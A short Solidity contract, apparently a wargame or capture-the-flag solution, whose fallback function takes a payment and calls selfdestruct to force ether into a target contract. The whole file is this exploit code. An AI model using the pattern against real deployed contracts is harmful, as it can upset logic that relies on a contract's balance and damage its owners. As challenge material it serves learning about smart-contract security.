// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackForce {
    address payable force;

    constructor(address payable _force) {
        force = _force;
    }

    fallback() external payable {
        require(msg.value > 0, "send some ether");
        selfdestruct(force);
    }
}
